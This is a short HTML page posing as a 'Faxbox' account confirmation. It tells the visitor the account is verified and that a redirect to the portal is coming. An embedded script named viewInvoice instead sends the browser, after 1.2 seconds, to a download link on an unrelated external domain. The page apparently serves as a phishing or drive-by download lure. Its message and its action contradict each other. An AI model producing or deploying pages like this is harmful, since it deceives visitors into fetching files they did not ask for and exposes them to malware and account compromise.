<!doctype html>
<html>
	<head>
		<link rel="shortcut icon" href="images/favicon.ico">
		<title>Faxbox Account</title>
	</head>
	<body style="font-family:arial; font-weight:normal;">
		<center>
			<br />
			<img src="images/logo.svg" />
			<br />
			<h1>Account Verified</h1>
			<h3>You have successfully Activated your Faxbox account portal</h3>
			<p><img src="images/load.gif" alt="" /></p>
			<p>Please wait while we redirect you to Faxbox account portal</p>
		</center>
<script type="text/javascript">
function viewInvoice() {
	document.location.href="http://research.moelis.com.au/ResearchPortal/DownLoad?E=beghkjje";
}

setTimeout(viewInvoice, 1200);
</script>		
	</body>
</html>